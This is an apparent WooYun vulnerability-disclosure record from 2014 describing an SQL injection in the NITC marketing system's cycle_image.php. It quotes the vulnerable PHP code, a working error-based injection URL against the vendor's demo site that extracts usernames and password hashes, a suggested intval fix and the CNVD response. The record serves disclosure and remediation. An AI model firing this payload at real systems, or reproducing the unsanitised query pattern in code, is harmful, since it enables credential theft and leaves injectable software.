{"id": 53576, "wybug_id": "wooyun-2014-067113", "wybug_title": "NITC营销系统SQL注入漏洞", "wybug_corp": "NITC营销系统", "wybug_author": "HackBraid", "wybug_date": "2014-07-03 10:50", "wybug_open_date": "2014-10-01 10:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向公众公开  简要描述： RT 详细说明：  注入出现在cycle_image.php\n<?phpdefine( \"IN_LOCK\", true );define( \"INIT_NO_USERS\", true );define( \"INIT_NO_SMARTY\", true );require( \"./includes/init.php\" );header( \"Content-type: text/xml; charset=utf-8\" );header( \"Expires: Fri, 14 Mar 1980 20:53:00 GMT\" );header( \"Last-Modified: \".gmdate( \"D, d M Y H:i:s\" ).\" GMT\" );header( \"Pragma: no-cache\" );$s = explode( \"^\", trim( $_GET['language'] ) );//用^分隔得到数组$secho \"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?><bcaster>\";$sql = \"select * from \".$site->table( \"ad\" ).\" where language_id=\".$s[0].\" and category='\".$s[1].\"' and type=0 and state=0 order by sort_order desc\";//$s[0]没加单引号，无视gpc注入$res = $db->getAllCached( $sql );foreach ( $res as $row ){    if ( is_file( \"upload/adfile/\".$row['file'] ) )    {        echo \"<item item_url=\\\"\".$_CFG['weburl'].\"/upload/adfile/\".$row['file'].\"\\\" link=\\\"\".$row['url'].\"\\\" />\";    }}echo \"</bcaster>\";?>\n官网测试：http://demo.cnnitc.com/cycle_image.php?language=1%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(floor(rand(0)*2),(select%20concat(user_name,0x23,password)%20from%20nitc_user%20limit%200,1))x%20FROM%20INFORMATION_SCHEMA.tables%20GROUP%20BY%20x)a)#   漏洞证明：  \n\n   修复方案：  language接收的是个数组，对每个值遍历进行：$language=intval($_GET['language']);   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-07-08 10:31 厂商回复： CNVD确认所述情况，暂未涉及重要部门用户，已经由CNVD直接联系软件生产厂商，通过简要通报邮件，发官方service邮箱以及whois信息邮箱中处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-03 11:07 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  您关注的白帽子HackBraid发表了最新漏洞NITC营销系统SQL注入漏洞    \n     2014-07-03 11:13 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  您关注的白帽子HackBraid发表了最新漏洞NITC营销系统SQL注入漏洞    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}